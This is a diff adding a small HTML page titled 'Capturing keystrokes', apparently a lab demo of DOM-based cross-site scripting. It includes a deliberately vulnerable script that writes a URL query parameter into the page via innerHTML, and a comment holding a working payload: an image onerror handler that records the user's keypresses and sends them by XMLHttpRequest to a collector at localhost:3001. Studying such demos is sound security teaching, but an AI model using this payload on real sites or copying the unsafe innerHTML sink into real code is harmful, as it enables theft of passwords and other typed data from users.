@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Capturing keystrokes</title>
+    <style>
+
+    </style>
+</head>
+<body>
+    <!-- Vulnerable code -->
+    <div id="example-div"></div>
+
+    <!-- insert this in the url as query param -->
+    <!-- ?name=<img src="does-not-exist" onerror='var timeout; var buffer = ""; document.querySelector("bod
+y").addEventListener("keypress", (event) => { if (event.which !== 0) { clearTimeout(timeout);
+buffer += String.fromCharCode(event.which); timeout = setTimeout(() => { var xhr = new XMLHttp
+Request(); var uri = "http://localhost:3001/keys?data="+ encodeURIComponent(buffer); xhr.open
+("GET", uri); xhr.send(); buffer = ""; }, 400); }});'\n/> /> -->
+
+    <!-- Vulnerable code -->
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        const name = params.get('name');
+        document.getElementById('example-div').innerHTML = `${name}`;
+    </script>
+
+</body>
+</html>
